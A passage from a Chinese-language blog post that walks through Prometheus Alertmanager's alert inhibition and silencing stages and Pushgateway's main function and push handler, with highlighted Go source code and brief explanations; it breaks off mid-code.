alerts...); err != <span class="literal">nil</span> &#123;</span><br><span class="line">me.Add(err)</span><br><span class="line">log.Errorf(<span class="string">"Error on notify: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(s)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> me.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, alerts, &amp;me</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ctx, alerts, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ms MultiStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> ms &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(alerts) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx, alerts, err = s.Exec(ctx, alerts...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ctx, alerts, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警抑制的配置，inhibit_rules配置项目：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *InhibitStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> filtered []*types.Alert</span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line">_, ok := n.marker.Inhibited(a.Fingerprint())</span><br><span class="line"><span class="comment">// TODO(fabxc): increment total alerts counter.</span></span><br><span class="line"><span class="comment">// Do not send the alert if the silencer mutes it.</span></span><br><span class="line"><span class="keyword">if</span> !n.muter.Mutes(a.Labels) &#123;</span><br><span class="line"><span class="comment">// TODO(fabxc): increment muted alerts counter.</span></span><br><span class="line">filtered = <span class="built_in">append</span>(filtered, a)</span><br><span class="line"><span class="comment">// Store whether a previously inhibited alert is firing again.</span></span><br><span class="line">a.WasInhibited = ok</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx, filtered, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警静音：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *SilenceStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> filtered []*types.Alert</span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line">_, ok := n.marker.Silenced(a.Fingerprint())</span><br><span class="line"><span class="comment">// TODO(fabxc): increment total alerts counter.</span></span><br><span class="line"><span class="comment">// Do not send the alert if the silencer mutes it.</span></span><br><span class="line">sils, err := n.silences.Query(</span><br><span class="line">silence.QState(silence.StateActive),</span><br><span class="line">silence.QMatches(a.Labels),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Querying silences failed: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sils) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// TODO(fabxc): increment muted alerts counter.</span></span><br><span class="line">filtered = <span class="built_in">append</span>(filtered, a)</span><br><span class="line">n.marker.SetSilenced(a.Labels.Fingerprint())</span><br><span class="line"><span class="comment">// Store whether a previously silenced alert is firing again.</span></span><br><span class="line">a.WasSilenced = ok</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ids := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(sils))</span><br><span class="line"><span class="keyword">for</span> i, s := <span class="keyword">range</span> sils &#123;</span><br><span class="line">ids[i] = s.Id</span><br><span class="line">&#125;</span><br><span class="line">n.marker.SetSilenced(a.Labels.Fingerprint(), ids...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx, filtered, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pushgateway"><a href="#Pushgateway" class="headerlink" title="Pushgateway"></a>Pushgateway</h2><p>pushgateway主要作用是允许临时任务和批作业向prometheus公开指标数据。主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这次 jobs 可以直接向 Prometheus server 端推送它们的 metrics。这种方式主要用于服务层面的 metrics，对于机器层面的 metrices，需要使用 node exporter。</p><p>push gateway的代码逻辑都再main函数里面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">app = kingpin.New(filepath.Base(os.Args[<span class="number">0</span>]), <span class="string">"The Pushgateway"</span>)</span><br><span class="line"></span><br><span class="line">listenAddress       = app.Flag(<span class="string">"web.listen-address"</span>, <span class="string">"Address to listen on for the web interface, API, and telemetry."</span>).Default(<span class="string">":9091"</span>).String()</span><br><span class="line">metricsPath         = app.Flag(<span class="string">"web.telemetry-path"</span>, <span class="string">"Path under which to expose metrics."</span>).Default(<span class="string">"/metrics"</span>).String()</span><br><span class="line">externalURL         = app.Flag(<span class="string">"web.external-url"</span>, <span class="string">"The URL under which the Pushgateway is externally reachable."</span>).Default(<span class="string">""</span>).URL()</span><br><span class="line">routePrefix         = app.Flag(<span class="string">"web.route-prefix"</span>, <span class="string">"Prefix for the internal routes of web endpoints. Defaults to the path of --web.external-url."</span>).Default(<span class="string">""</span>).String()</span><br><span class="line">enableLifeCycle     = app.Flag(<span class="string">"web.enable-lifecycle"</span>, <span class="string">"Enable shutdown via HTTP request."</span>).Default(<span class="string">"false"</span>).Bool()</span><br><span class="line">enableAdminAPI      = app.Flag(<span class="string">"web.enable-admin-api"</span>, <span class="string">"Enable API endpoints for admin control actions."</span>).Default(<span class="string">"false"</span>).Bool()</span><br><span class="line">persistenceFile     = app.Flag(<span class="string">"persistence.file"</span>, <span class="string">"File to persist metrics. If empty, metrics are only kept in memory."</span>).Default(<span class="string">""</span>).String()</span><br><span class="line">persistenceInterval = app.Flag(<span class="string">"persistence.interval"</span>, <span class="string">"The minimum interval at which to write out the persistence file."</span>).Default(<span class="string">"5m"</span>).Duration()</span><br><span class="line">promlogConfig       = promlog.Config&#123;&#125;</span><br><span class="line">)</span><br><span class="line">promlogflag.AddFlags(app, &amp;promlogConfig)</span><br><span class="line">app.Version(version.Print(<span class="string">"pushgateway"</span>))</span><br><span class="line">app.HelpFlag.Short(<span class="string">'h'</span>)</span><br><span class="line">kingpin.MustParse(app.Parse(os.Args[<span class="number">1</span>:]))</span><br><span class="line">logger := promlog.New(&amp;promlogConfig)</span><br><span class="line"></span><br><span class="line">*routePrefix = computeRoutePrefix(*routePrefix, *externalURL)</span><br><span class="line">externalPathPrefix := computeRoutePrefix(<span class="string">""</span>, *externalURL)</span><br><span class="line"></span><br><span class="line">level.Info(logger).Log(<span class="string">"msg"</span>, <span class="string">"starting pushgateway"</span>, <span class="string">"version"</span>, version.Info())</span><br><span class="line">level.Info(logger).Log(<span class="string">"build_context"</span>, version.BuildContext())</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"external URL"</span>, <span class="string">"url"</span>, *externalURL)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"path prefix used externally"</span>, <span class="string">"path"</span>, externalPathPrefix)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"path prefix for internal routing"</span>, <span class="string">"path"</span>, *routePrefix)</span><br><span class="line"></span><br><span class="line"><span class="comment">// flags is used to show command line flags on the status page.</span></span><br><span class="line"><span class="comment">// Kingpin default flags are excluded as they would be confusing.</span></span><br><span class="line">flags := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">boilerplateFlags := kingpin.New(<span class="string">""</span>, <span class="string">""</span>).Version(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> app.Model().Flags &#123;</span><br><span class="line"><span class="keyword">if</span> boilerplateFlags.GetFlag(f.Name) == <span class="literal">nil</span> &#123;</span><br><span class="line">flags[f.Name] = f.Value.String()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ms := storage.NewDiskMetricStore(*persistenceFile, *persistenceInterval, prometheus.DefaultGatherer, logger)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a Gatherer combining the DefaultGatherer and the metrics from the metric store.</span></span><br><span class="line">g := prometheus.Gatherers&#123;</span><br><span class="line">prometheus.DefaultGatherer,</span><br><span class="line">prometheus.GathererFunc(<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="params">([]*dto.MetricFamily, error)</span></span> &#123; <span class="keyword">return</span> ms.GetMetricFamilies(), <span class="literal">nil</span> &#125;),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := httprouter.New()</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/-/healthy"</span>, handler.Healthy(ms))</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/-/ready"</span>, handler.Ready(ms))</span><br><span class="line">r.Handler(</span><br><span class="line"><span class="string">"GET"</span>, path.Join(*routePrefix, *metricsPath),</span><br><span class="line">promhttp.HandlerFor(g, promhttp.HandlerOpts&#123;</span><br><span class="line">ErrorLog: logFunc(level.Error(logger).Log),</span><br><span class="line">&#125;),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *enableAdminAPI &#123;</span><br><span class="line"><span class="comment">// To be consistent with Prometheus codebase and provide endpoint versioning, we use the same path</span></span><br><span class="line"><span class="comment">// as Prometheus for its admin endpoints, even if this may feel excesive for just one simple endpoint</span></span><br><span class="line"><span class="comment">// this will likely change over time.</span></span><br><span class="line">r.Handler(<span class="string">"PUT"</span>, *routePrefix+<span class="string">"/api/v1/admin/wipe"</span>, handler.WipeMetricStore(ms, logger))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handlers for pushing and deleting metrics.</span></span><br><span class="line">pushAPIPath := *routePrefix + <span class="string">"/metrics"</span></span><br><span class="line"><span class="keyword">for</span> _, suffix := <span class="keyword">range</span> []<span class="keyword">string</span>&#123;<span class="string">""</span>, handler.Base64Suffix&#125; &#123;</span><br><span class="line">jobBase64Encoded := suffix == handler.Base64Suffix</span><br><span class="line">r.PUT(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job/*labels"</span>, handler.Push(ms, <span class="literal">true</span>, jobBase64Encoded, logger))</span><br><span class="line">r.POST(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job/*labels"</span>, handler.Push(ms, <span class="literal">false</span>, jobBase64Encoded, logger))</span><br><span class="line">r.DELETE(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job/*labels"</span>, handler.Delete(ms, jobBase64Encoded, logger))</span><br><span class="line">r.PUT(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job"</span>, handler.Push(ms, <span class="literal">true</span>, jobBase64Encoded, logger))</span><br><span class="line">r.POST(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job"</span>, handler.Push(ms, <span class="literal">false</span>, jobBase64Encoded, logger))</span><br><span class="line">r.DELETE(pushAPIPath+<span class="string">"/job"</span>+suffix+<span class="string">"/:job"</span>, handler.Delete(ms, jobBase64Encoded, logger))</span><br><span class="line">&#125;</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/static/*filepath"</span>, handler.Static(asset.Assets, *routePrefix))</span><br><span class="line"></span><br><span class="line">statusHandler := handler.Status(ms, asset.Assets, flags, externalPathPrefix, logger)</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/status"</span>, statusHandler)</span><br><span class="line">r.Handler(<span class="string">"GET"</span>, *routePrefix+<span class="string">"/"</span>, statusHandler)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Re-enable pprof.</span></span><br><span class="line">r.GET(*routePrefix+<span class="string">"/debug/pprof/*pprof"</span>, handlePprof)</span><br><span class="line"></span><br><span class="line">level.Info(logger).Log(<span class="string">"listen_address"</span>, *listenAddress)</span><br><span class="line">l, err := net.Listen(<span class="string">"tcp"</span>, *listenAddress)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(logger).Log(<span class="string">"err"</span>, err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">quitCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">quitHandler := http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">"Requesting termination... Goodbye!"</span>)</span><br><span class="line"><span class="built_in">close</span>(quitCh)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">forbiddenAPINotEnabled := http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusForbidden)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Lifecycle API is not enabled."</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *enableLifeCycle &#123;</span><br><span class="line">r.Handler(<span class="string">"PUT"</span>, *routePrefix+<span class="string">"/-/quit"</span>, quitHandler)</span><br><span class="line">r.Handler(<span class="string">"POST"</span>, *routePrefix+<span class="string">"/-/quit"</span>, quitHandler)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r.Handler(<span class="string">"PUT"</span>, *routePrefix+<span class="string">"/-/quit"</span>, forbiddenAPINotEnabled)</span><br><span class="line">r.Handler(<span class="string">"POST"</span>, *routePrefix+<span class="string">"/-/quit"</span>, forbiddenAPINotEnabled)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Handler(<span class="string">"GET"</span>, <span class="string">"/-/quit"</span>, http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">w.WriteHeader(http.StatusMethodNotAllowed)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">"Only POST or PUT requests allowed."</span>))</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> closeListenerOnQuit(l, quitCh, logger)</span><br><span class="line">err = (&amp;http.Server&#123;Addr: *listenAddress, Handler: r&#125;).Serve(l)</span><br><span class="line">level.Error(logger).Log(<span class="string">"msg"</span>, <span class="string">"HTTP server stopped"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="comment">// To give running connections a chance to submit their payload, we wait</span></span><br><span class="line"><span class="comment">// for 1sec, but we don't want to wait long (e.g. until all connections</span></span><br><span class="line"><span class="comment">// are done) to not delay the shutdown.</span></span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line"><span class="keyword">if</span> err := ms.Shutdown(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(logger).Log(<span class="string">"msg"</span>, <span class="string">"problem shutting down metric storage"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过push到接口metric传递数据到prometheus，push接口调用push函数去使用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Push returns an http.Handler which accepts samples over HTTP and stores them</span></span><br><span class="line"><span class="comment">// in the MetricStore. If replace is true, all metrics for the job and instance</span></span><br><span class="line"><span class="comment">// given by the request are deleted before new ones are stored.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The returned handler is already instrumented for Prometheus.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ms storage.MetricStore, replace <span class="keyword">bool</span>, jobBase64Encoded <span class="keyword">bool</span>, logger log.Logger,</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> <span class="title">func</span><span class="params">(http.ResponseWriter, *http.Request, httprouter.Params)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> ps httprouter.Params</span><br><span class="line"><span class="keyword">var</span> mtx sync.Mutex <span class="comment">// Protects ps.</span></span><br><span class="line"></span><br><span class="line">handler := http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">job := ps.ByName(<span class="string">"job"</span>)</span><br><span class="line"><span class="keyword">if</span> jobBase64Encoded &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> job, err = decodeBase64(job); err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, fmt.Sprintf(<span class="string">"invalid base64 encoding in job name %q: %v"</span>, ps.ByName(<span class="string">"job"</span>), err), http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"invalid base64 encoding in job name"</span>, <span class="string">"job"</span>, ps.ByName(<span class="string">"job"</span>), <span class="string">"err"</span>, err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">labelsString := ps.ByName(<span class="string">"labels"</span>)</span><br><span class="line">mtx.Unlock()</span><br><span class="line"></span><br><span class="line">labels, err := splitLabels(labelsString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, err.Error(), http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"failed to parse URL"</span>, <span class="string">"url"</span>, labelsString, <span class="string">"err"</span>, err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> job == <span class="string">""</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">"job name is required"</span>, http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"job name is required"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">labels[<span class="string">"job"</span>] = job</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> metricFamilies <span class="keyword">map</span>[<span class="keyword">string</span>]*dto.MetricFamily</span><br><span class="line">ctMediatype, ctParams, ctErr := mime.ParseMediaType(r.Header.Get(<span class="string">"Content-Type"</span>))</span><br><span class="line"><span class="keyword">if</span> ctErr == <span class="literal">nil</span> &amp;&amp; ctMediatype == <span class="string">"application/vnd.google.protobuf"</span> &amp;&amp;</span><br><span class="line">ctParams[<span class="string">"encoding"</span>] == <span class="string">"delimited"</span> &amp;&amp;</span><br><span class="line">ctParams[<span class="string">"proto"</span>] == <span class="string">"io.prometheus.client.MetricFamily"</span> &#123;</span><br><span class="line">metricFamilies = <span class="keyword">map</span>[<span class="keyword">string</span>]*dto.MetricFamily&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">mf := &amp;dto.MetricFamily&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> _, err = pbutil.ReadDelimited(r.Body, mf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">err = <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">metricFamilies[mf.GetName()] = mf</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// We could do further content-type checks here, but the</span></span><br><span class="line"><span class="comment">// fallback for now will anyway be the text format</span></span><br><span class="line"><span class="comment">// version 0.0.4, so just go for it and see if it works.</span></span><br><span class="line"><span class="keyword">var</span> parser expfmt.TextParser</span><br><span class="line">metricFamilies, err = parser.TextToMetricFamilies(r.Body)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, err.Error(), http.StatusBadRequest)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"failed to parse text"</span>, <span class="string">"err"</span>, err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">now := time.Now()</span><br><span class="line">errCh := <span class="built_in">make</span>(<span class="keyword">chan</span> error, <span class="number">1</span>)</span><br><span class="line">errReceived := <span class="literal">false</span></span><br><span class="line">ms.SubmitWriteRequest(storage.WriteRequest&#123;</span><br><span class="line">Labels:         labels,</span><br><span class="line">Timestamp:      now,</span><br><span class="line">MetricFamilies: metricFamilies,</span><br><span class="line">Replace:        replace,</span><br><span class="line">Done:           errCh,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">for</span> err := <span class="keyword">range</span> errCh &#123;</span><br><span class="line"><span class="comment">// Send only first error via HTTP, but log all of them.</span></span><br><span class="line"><span class="comment">// TODO(beorn): Consider sending all errors once we</span></span><br><span class="line"><span class="comment">// have a use case. (Currently, at most one error is</span></span><br><span class="line"><span class="comment">// produced.)</span></span><br><span class="line"><span class="keyword">if</span> !errReceived &#123;</span><br><span class="line">http.Error(</span><br><span class="line">w,</span><br><span class="line">fmt.Sprintf(<span class="string">"pushed metrics are invalid or 